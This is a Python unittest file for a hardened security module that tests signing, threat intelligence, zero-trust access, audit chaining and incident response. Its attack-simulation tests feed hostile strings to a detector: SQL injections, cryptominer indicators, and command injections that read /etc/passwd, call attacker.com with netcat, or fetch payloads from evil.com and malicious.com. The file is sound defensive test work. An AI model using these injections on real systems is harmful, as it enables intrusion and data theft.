"""
Comprehensive security tests for M010 Pass 3 - Security Hardening
Tests all hardened components and security features.
"""

import unittest
import asyncio
import json
import time
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
import tempfile
import shutil
from unittest.mock import Mock, patch, MagicMock

# Import hardened components
from devdocai.security.hardened.crypto_manager import CryptoManager
from devdocai.security.hardened.threat_intelligence import (
    ThreatIntelligenceEngine,
    ThreatIndicator,
    ThreatSeverity,
    ThreatType
)
from devdocai.security.hardened.zero_trust import (
    ZeroTrustManager,
    Identity,
    Resource,
    AccessContext,
    AccessDecision,
    TrustLevel,
    ResourceType
)
from devdocai.security.hardened.audit_forensics import (
    AuditForensics,
    AuditLevel,
    EventCategory
)
from devdocai.security.hardened.security_orchestrator import (
    SecurityOrchestrator,
    IncidentSeverity,
    IncidentStatus
)
from devdocai.security.security_manager_hardened import (
    HardenedSecurityManager,
    SecurityPosture
)


class TestCryptoManager(unittest.TestCase):
    """Test advanced cryptographic operations."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.crypto = CryptoManager(Path(self.temp_dir))
    
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_ed25519_signing(self):
        """Test Ed25519 digital signatures."""
        # Test data
        data = b"Important security audit log entry"
        
        # Sign data
        signature, metadata = self.crypto.sign_data(data)
        
        # Verify signature
        self.assertIsNotNone(signature)
        self.assertIn('algorithm', metadata)
        self.assertEqual(metadata['algorithm'], 'Ed25519')
        self.assertIn('public_key', metadata)
        
        # Verify with public key
        import base64
        public_key_pem = base64.b64decode(metadata['public_key'])
        is_valid = self.crypto.verify_signature(data, signature, public_key_pem)
        self.assertTrue(is_valid)
        
        # Test invalid signature
        invalid_signature = b"invalid" + signature[7:]
        is_valid = self.crypto.verify_signature(data, invalid_signature, public_key_pem)
        self.assertFalse(is_valid)
    
    def test_hmac_integrity(self):
        """Test HMAC-SHA256 for data integrity."""
        # Test data
        data = b"Sensitive configuration data"
        
        # Compute HMAC
        hmac_value = self.crypto.compute_hmac(data)
        
        # Verify HMAC
        self.assertIsNotNone(hmac_value)
        is_valid = self.crypto.verify_hmac(data, hmac_value)
        self.assertTrue(is_valid)
        
        # Test tampered data
        tampered_data = b"Tampered configuration data"
        is_valid = self.crypto.verify_hmac(tampered_data, hmac_value)
        self.assertFalse(is_valid)
    
    def test_key_rotation(self):
        """Test secure key rotation."""
        # Get initial key info
        initial_info = self.crypto.get_key_info('master')
        initial_versions = len(initial_info['versions'])
        
        # Rotate keys
        self.crypto.rotate_keys('master')
        
        # Get updated key info
        updated_info = self.crypto.get_key_info('master')
        updated_versions = len(updated_info['versions'])
        
        # Verify rotation
        self.assertEqual(updated_versions, initial_versions + 2)  # Signing + HMAC
    
    def test_certificate_generation(self):
        """Test certificate generation and verification."""
        # Generate certificate
        cert_pem, key_pem = self.crypto.generate_certificate(
            subject_name="test.devdocai.local",
            key_size=2048,
            valid_days=365
        )
        
        # Verify certificate
        self.assertIsNotNone(cert_pem)
        self.assertIsNotNone(key_pem)
        
        cert_info = self.crypto.verify_certificate(cert_pem)
        self.assertTrue(cert_info['valid'])
        self.assertTrue(cert_info['is_self_signed'])
        self.assertFalse(cert_info['is_expired'])


class TestThreatIntelligence(unittest.TestCase):
    """Test threat intelligence engine."""
    
    def setUp(self):
        """Set up test environment."""
        self.threat_intel = ThreatIntelligenceEngine()
    
    def test_threat_indicator_management(self):
        """Test threat indicator storage and retrieval."""
        # Create test indicator
        indicator = ThreatIndicator(
            indicator_id="test-001",
            type="ip",
            value="192.168.1.100",
            severity=ThreatSeverity.HIGH,
            confidence=0.9,
            source="test",
            first_seen=datetime.utcnow(),
            last_seen=datetime.utcnow(),
            tags=["malware", "c2"]
        )
        
        # Add indicator
        self.threat_intel.add_indicator(indicator)
        
        # Check indicator
        found = self.threat_intel.check_indicator("192.168.1.100")
        self.assertIsNotNone(found)
        self.assertEqual(found.severity, ThreatSeverity.HIGH)
    
    def test_yara_threat_hunting(self):
        """Test YARA-based threat hunting."""
        # Test data with SQL injection attempt
        malicious_data = "SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users;"
        
        # Hunt for threats
        matches = self.threat_intel.hunt_threats(malicious_data)
        
        # Verify detection
        self.assertGreater(len(matches), 0)
        sql_injection_found = any(
            'SQL' in match['rule'] or 'sql' in match['description'].lower()
            for match in matches
        )
        self.assertTrue(sql_injection_found)
    
    def test_anomaly_detection(self):
        """Test anomaly detection using ML."""
        # Normal features
        normal_features = [0.1, 0.2, 0.15, 0.25, 0.3]
        is_anomaly, score = self.threat_intel.detect_anomalies(normal_features)
        
        # Anomalous features
        anomaly_features = [0.9, 0.95, 0.85, 0.92, 0.88]
        is_anomaly2, score2 = self.threat_intel.detect_anomalies(anomaly_features)
        
        # Verify detection (model needs training data, so this is basic)
        self.assertIsInstance(is_anomaly, bool)
        self.assertIsInstance(score, float)
        self.assertTrue(0 <= score <= 1)
    
    def test_event_correlation(self):
        """Test security event correlation."""
        # Create test events
        events = [
            {'type': 'failed_login', 'source_ip': '10.0.0.1', 'user': 'admin'},
            {'type': 'failed_login', 'source_ip': '10.0.0.1', 'user': 'admin'},
            {'type': 'failed_login', 'source_ip': '10.0.0.1', 'user': 'admin'},
            {'type': 'failed_login', 'source_ip': '10.0.0.1', 'user': 'admin'},
            {'type': 'failed_login', 'source_ip': '10.0.0.1', 'user': 'admin'},
        ]
        
        # Correlate events
        threat_events = self.threat_intel.correlate_events(events)
        
        # Verify correlation detected brute force
        self.assertGreater(len(threat_events), 0)
        brute_force_detected = any(
            event.threat_type == ThreatType.UNAUTHORIZED_ACCESS
            for event in threat_events
        )
        self.assertTrue(brute_force_detected)


class TestZeroTrust(unittest.TestCase):
    """Test zero trust architecture."""
    
    def setUp(self):
        """Set up test environment."""
        self.zero_trust = ZeroTrustManager()
        
        # Register test identity
        self.identity = Identity(
            identity_id="user-001",
            type="user",
            name="Test User",
            trust_level=TrustLevel.MEDIUM,
            attributes={'department': 'engineering'}
        )
        self.zero_trust.register_identity(self.identity)
        
        # Register test resource
        self.resource = Resource(
            resource_id="res-001",
            type=ResourceType.DATABASE,
            name="Customer Database",
            sensitivity_level=3,
            owner="data-team",
            permissions={'user': ['read', 'write']}
        )
        self.zero_trust.register_resource(self.resource)
    
    def test_access_verification(self):
        """Test zero trust access verification."""
        # Create access context
        context = AccessContext(
            identity=self.identity,
            resource=self.resource,
            action="read",
            timestamp=datetime.utcnow(),
            network_zone="internal"
        )
        
        # Verify access
        decision, details = self.zero_trust.verify_access(context)
        
        # Check decision
        self.assertIn(decision, [AccessDecision.ALLOW, AccessDecision.DENY, 
                                 AccessDecision.CHALLENGE, AccessDecision.STEP_UP])
        self.assertIn('risk_score', details)
        self.assertIn('trust_level', details)
    
    def test_least_privilege_enforcement(self):
        """Test principle of least privilege."""
        # Get permissions
        permissions = self.zero_trust.enforce_least_privilege(
            "user-001",
            "res-001"
        )
        
        # Verify permissions based on trust level
        self.assertIsInstance(permissions, list)
        # Medium trust should get read and write
        self.assertIn('read', permissions)
        self.assertIn('write', permissions)
        
        # Test with untrusted identity
        untrusted = Identity(
            identity_id="user-002",
            type="user",
            name="Untrusted User",
            trust_level=TrustLevel.UNTRUSTED
        )
        self.zero_trust.register_identity(untrusted)
        
        permissions = self.zero_trust.enforce_least_privilege(
            "user-002",
            "res-001"
        )
        self.assertEqual(permissions, [])  # No permissions for untrusted
    
    def test_challenge_verification(self):
        """Test identity challenge and verification."""
        # Issue challenge
        challenge = self.zero_trust.challenge_identity("user-001", "mfa")
        
        # Verify challenge issued
        self.assertIn('challenge_id', challenge)
        self.assertEqual(challenge['type'], 'mfa')
        self.assertEqual(challenge['status'], 'pending')
        
        # Verify challenge response (simulated)
        success, new_trust = self.zero_trust.verify_challenge(
            challenge['challenge_id'],
            "123456"  # Simulated MFA code
        )
        
        self.assertTrue(success)
        self.assertEqual(new_trust, TrustLevel.HIGH)  # Trust increased
    
    def test_access_token_creation(self):
        """Test JWT access token creation and verification."""
        # Create token
        token = self.zero_trust.create_access_token(
            self.identity,
            self.resource,
            ['read']
        )
        
        # Verify token
        self.assertIsNotNone(token)
        
        # Decode token
        payload = self.zero_trust.verify_token(token)
        self.assertIsNotNone(payload)
        self.assertEqual(payload['sub'], "user-001")
        self.assertEqual(payload['resource'], "res-001")
        self.assertIn('read', payload['permissions'])


class TestAuditForensics(unittest.TestCase):
    """Test audit and forensics system."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.audit = AuditForensics(Path(self.temp_dir))
    
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_blockchain_event_chaining(self):
        """Test tamper-proof blockchain-style event chaining."""
        # Log events
        event_ids = []
        for i in range(5):
            event_id = self.audit.log_event(
                level=AuditLevel.INFO,
                category=EventCategory.SECURITY,
                action=f"test_action_{i}",
                actor="test_user",
                target="test_resource",
                result="success"
            )
            event_ids.append(event_id)
        
        # Verify chain integrity
        is_valid, issues = self.audit.verify_integrity()
        self.assertTrue(is_valid)
        self.assertEqual(len(issues), 0)
    
    def test_tamper_detection(self):
        """Test detection of tampered audit logs."""
        # Log events
        for i in range(3):
            self.audit.log_event(
                level=AuditLevel.INFO,
                category=EventCategory.SECURITY,
                action=f"action_{i}",
                actor="user",
                target="resource",
                result="success"
            )
        
        # Tamper with an event (simulate)
        if self.audit._chain:
            # Modify an event's data
            self.audit._chain[1].actor = "tampered_user"
            # This breaks the hash chain
        
        # Verify integrity
        is_valid, issues = self.audit.verify_integrity()
        
        # Should detect tampering
        if len(self.audit._chain) > 1:
            self.assertFalse(is_valid)
            self.assertGreater(len(issues), 0)
    
    def test_forensic_artifact_collection(self):
        """Test forensic artifact collection and storage."""
        # Test artifact data
        artifact_data = b"Memory dump or network capture data"
        
        # Collect artifact
        artifact_id = self.audit.collect_artifact(
            artifact_type="memory_dump",
            source="system",
            data=artifact_data,
            metadata={'incident': 'test-001'}
        )
        
        # Verify artifact stored
        self.assertIsNotNone(artifact_id)
        self.assertIn(artifact_id, self.audit._artifacts)
        
        artifact = self.audit._artifacts[artifact_id]
        self.assertEqual(artifact.artifact_type, "memory_dump")
        self.assertEqual(artifact.size_bytes, len(artifact_data))
        self.assertTrue(artifact.storage_path.exists())
    
    def test_correlation_analysis(self):
        """Test event correlation analysis."""
        # Log correlated events
        correlation_id = "incident-001"
        
        for i in range(5):
            self.audit.log_event(
                level=AuditLevel.WARNING,
                category=EventCategory.AUTHENTICATION,
                action="failed_login",
                actor="attacker",
                target="system",
                result="failure",
                correlation_id=correlation_id
            )
        
        # Analyze correlation
        analysis = self.audit.analyze_correlation(correlation_id)
        
        # Verify analysis
        self.assertEqual(analysis['correlation_id'], correlation_id)
        self.assertEqual(analysis['event_count'], 5)
        self.assertIn('timeline', analysis)
        self.assertIn('anomalies', analysis)
    
    def test_compliance_report_generation(self):
        """Test compliance evidence report generation."""
        # Log some compliance-related events
        for i in range(10):
            self.audit.log_event(
                level=AuditLevel.INFO,
                category=EventCategory.DATA_ACCESS,
                action="data_read",
                actor=f"user_{i}",
                target="sensitive_data",
                result="success"
            )
        
        # Generate SOC2 report
        report = self.audit.generate_compliance_report(
            start_date=datetime.utcnow() - timedelta(days=1),
            end_date=datetime.utcnow(),
            compliance_framework='SOC2'
        )
        
        # Verify report structure
        self.assertEqual(report['framework'], 'SOC2')
        self.assertIn('evidence', report)
        self.assertIn('statistics', report)
        self.assertEqual(report['integrity_status'], 'verified')


class TestSecurityOrchestrator(unittest.TestCase):
    """Test SOAR capabilities."""
    
    def setUp(self):
        """Set up test environment."""
        self.orchestrator = SecurityOrchestrator()
    
    def test_incident_creation(self):
        """Test security incident creation."""
        # Create incident
        incident_id = self.orchestrator.create_incident(
            title="Test Security Incident",
            description="Detected malware on endpoint",
            incident_type="malware",
            severity=IncidentSeverity.HIGH,
            affected_assets=["workstation-001"],
            indicators=[
                {'type': 'file_hash', 'value': 'abc123', 'confidence': 0.9}
            ]
        )
        
        # Verify incident created
        self.assertIsNotNone(incident_id)
        incident = self.orchestrator.get_incident(incident_id)
        self.assertIsNotNone(incident)
        self.assertEqual(incident.severity, IncidentSeverity.HIGH)
        self.assertEqual(incident.status, IncidentStatus.NEW)
    
    @patch('devdocai.security.hardened.security_orchestrator.logger')
    async def test_playbook_execution(self, mock_logger):
        """Test automated playbook execution."""
        # Create incident
        incident_id = self.orchestrator.create_incident(
            title="Malware Detection",
            description="Malware detected on system",
            incident_type="malware",
            severity=IncidentSeverity.HIGH,
            affected_assets=["server-001"]
        )
        
        # Execute playbook
        execution_id = await self.orchestrator.execute_playbook(
            'playbook_malware_response',
            incident_id
        )
        
        # Verify execution started
        self.assertIsNotNone(execution_id)
        self.assertIn(execution_id, self.orchestrator._playbook_executions)
        
        # Wait for execution (simplified test)
        await asyncio.sleep(0.1)
        
        # Check execution recorded
        execution = self.orchestrator._playbook_executions[execution_id]
        self.assertEqual(execution['playbook_id'], 'playbook_malware_response')
        self.assertEqual(execution['incident_id'], incident_id)
    
    def test_automated_response_actions(self):
        """Test automated response action handlers."""
        # Test context
        context = {
            'incident': Mock(
                affected_assets=['host-001'],
                metadata={'source_ip': '10.0.0.1'}
            ),
            'parameters': {'duration': 3600}
        }
        
        # Test block IP action
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            self.orchestrator._action_block_ip(context)
        )
        
        self.assertEqual(result['action'], 'block_ip')
        self.assertEqual(result['status'], 'success')
        
        # Test isolate host action
        result = loop.run_until_complete(
            self.orchestrator._action_isolate_host(context)
        )
        
        self.assertEqual(result['action'], 'isolate_host')
        self.assertEqual(result['status'], 'success')
        self.assertIn('hosts', result)


class TestHardenedSecurityManager(unittest.TestCase):
    """Test integrated hardened security manager."""
    
    def setUp(self):
        """Set up test environment."""
        self.config = {
            'threat_feeds': {},
            'zero_trust': {},
            'soar': {}
        }
        with patch('devdocai.security.security_manager_hardened.threading.Timer'):
            self.manager = HardenedSecurityManager(self.config)
    
    def test_access_request_processing(self):
        """Test zero-trust access request processing."""
        # Register test identity and resource
        identity = Identity(
            identity_id="test-user",
            type="user",
            name="Test User",
            trust_level=TrustLevel.MEDIUM
        )
        self.manager.zero_trust.register_identity(identity)
        
        resource = Resource(
            resource_id="test-resource",
            type=ResourceType.API,
            name="Test API",
            sensitivity_level=2,
            owner="api-team",
            permissions={'user': ['read']}
        )
        self.manager.zero_trust.register_resource(resource)
        
        # Process access request
        allowed, details = self.manager.process_access_request(
            identity_id="test-user",
            resource_id="test-resource",
            action="read",
            context={'network_zone': 'internal'}
        )
        
        # Verify processing
        self.assertIsInstance(allowed, bool)
        self.assertIn('processing_time', details)
        
        if allowed:
            self.assertIn('access_token', details)
            self.assertIn('permissions', details)
    
    def test_threat_detection_and_response(self):
        """Test integrated threat detection and response."""
        # Test data with threats
        malicious_data = "eval(base64_decode('malicious_payload'))"
        
        # Detect and respond
        results = self.manager.detect_and_respond(
            data=malicious_data,
            context={
                'affected_assets': ['server-001'],
                'indicators': ['192.168.1.100'],
                'features': [0.9, 0.8, 0.95, 0.85, 0.9]
            }
        )
        
        # Verify detection
        self.assertIn('yara_matches', results)
        self.assertIn('threats_detected', results)
        self.assertIn('incidents_created', results)
        
        # Should detect base64 and eval patterns
        self.assertGreater(len(results['yara_matches']), 0)
    
    def test_forensic_evidence_collection(self):
        """Test forensic evidence collection with signing."""
        # Test evidence
        evidence_data = b"Critical system logs and memory dump"
        
        # Collect evidence
        artifact_id = self.manager.collect_forensic_evidence(
            artifact_type="system_logs",
            source="syslog",
            data=evidence_data,
            incident_id="INC-001"
        )
        
        # Verify collection
        self.assertIsNotNone(artifact_id)
        
        # Verify artifact has signature
        artifact = self.manager.audit_forensics._artifacts.get(artifact_id)
        if artifact:
            self.assertIn('signature', artifact.metadata)
            self.assertIn('signature_metadata', artifact.metadata)
    
    def test_security_posture_assessment(self):
        """Test security posture assessment."""
        # Assess posture
        self.manager._assess_security_posture()
        
        # Verify assessment
        self.assertIsNotNone(self.manager._security_posture)
        self.assertIsInstance(self.manager._risk_score, float)
        self.assertTrue(0 <= self.manager._risk_score <= 1)
        self.assertIn(self.manager._security_posture, list(SecurityPosture))
    
    def test_security_report_generation(self):
        """Test comprehensive security report generation."""
        # Generate executive report
        report = self.manager.generate_security_report(
            report_type='executive',
            period_days=7
        )
        
        # Verify report structure
        self.assertEqual(report['report_type'], 'executive')
        self.assertIn('security_posture', report)
        self.assertIn('metrics', report)
        self.assertIn('threat_intelligence', report)
        self.assertIn('zero_trust', report)
        self.assertIn('audit', report)
        self.assertIn('soar', report)
        self.assertIn('compliance', report)
        self.assertIn('executive_summary', report)
        
        # Verify executive summary
        summary = report['executive_summary']
        self.assertIn('key_findings', summary)
        self.assertIn('recommendations', summary)
        self.assertIn('compliance_summary', summary)
    
    def test_audit_integrity_verification(self):
        """Test audit log integrity verification."""
        # Log some events
        for i in range(10):
            self.manager.audit_forensics.log_event(
                level=AuditLevel.INFO,
                category=EventCategory.SYSTEM,
                action=f"test_action_{i}",
                actor="system",
                target="resource",
                result="success"
            )
        
        # Verify integrity
        is_valid, issues = self.manager.verify_audit_integrity()
        
        # Should be valid (no tampering)
        self.assertTrue(is_valid)
        self.assertEqual(len(issues), 0)
    
    def test_performance_metrics(self):
        """Test performance metrics collection."""
        # Get metrics
        metrics = self.manager.get_performance_metrics()
        
        # Verify metrics structure
        self.assertIn('hardened_components', metrics)
        self.assertIn('optimized_components', metrics)
        self.assertIn('overall_metrics', metrics)
        self.assertIn('security_posture', metrics)
        
        # Verify hardened components metrics
        hardened = metrics['hardened_components']
        self.assertIn('crypto_operations', hardened)
        self.assertIn('threat_intelligence', hardened)
        self.assertIn('zero_trust', hardened)
        self.assertIn('audit_forensics', hardened)
        self.assertIn('soar', hardened)


class TestSecurityAttackSimulation(unittest.TestCase):
    """Simulate security attacks to test hardening."""
    
    def setUp(self):
        """Set up test environment."""
        with patch('devdocai.security.security_manager_hardened.threading.Timer'):
            self.manager = HardenedSecurityManager()
    
    def test_sql_injection_detection(self):
        """Test SQL injection attack detection."""
        # SQL injection attempts
        attacks = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "admin' --",
            "' UNION SELECT * FROM passwords--"
        ]
        
        for attack in attacks:
            results = self.manager.detect_and_respond(attack)
            self.assertGreater(len(results['yara_matches']), 0)
            
            # Verify SQL injection detected
            sql_detected = any(
                'sql' in match['rule'].lower() or 
                'sql' in match.get('description', '').lower()
                for match in results['yara_matches']
            )
            self.assertTrue(sql_detected)
    
    def test_command_injection_detection(self):
        """Test command injection attack detection."""
        # Command injection attempts
        attacks = [
            "'; cat /etc/passwd",
            "| nc attacker.com 4444",
            "`wget http://malicious.com/shell.sh`",
            "$(curl http://evil.com/payload)"
        ]
        
        for attack in attacks:
            results = self.manager.detect_and_respond(attack)
            self.assertGreater(len(results['yara_matches']), 0)
    
    def test_cryptominer_detection(self):
        """Test cryptocurrency miner detection."""
        # Cryptominer indicators
        miner_data = """
        stratum+tcp://pool.monero.com:3333
        xmrig --algo cryptonight
        """
        
        results = self.manager.detect_and_respond(miner_data)
        self.assertGreater(len(results['yara_matches']), 0)
        
        # Verify miner detected
        miner_detected = any(
            'miner' in match['rule'].lower() or
            'crypto' in match.get('description', '').lower()
            for match in results['yara_matches']
        )
        self.assertTrue(miner_detected)
    
    def test_brute_force_response(self):
        """Test automated response to brute force attack."""
        # Simulate failed login attempts
        for i in range(6):
            self.manager.audit_forensics.log_event(
                level=AuditLevel.WARNING,
                category=EventCategory.AUTHENTICATION,
                action="login_attempt",
                actor="attacker",
                target="admin_account",
                result="failure",
                source_ip="10.0.0.1",
                correlation_id="brute-force-001"
            )
        
        # Analyze correlation
        analysis = self.manager.audit_forensics.analyze_correlation("brute-force-001")
        
        # Should detect anomaly
        self.assertGreater(len(analysis['anomalies']), 0)
        self.assertIn('Rapid failure pattern', str(analysis['anomalies']))


if __name__ == '__main__':
    unittest.main()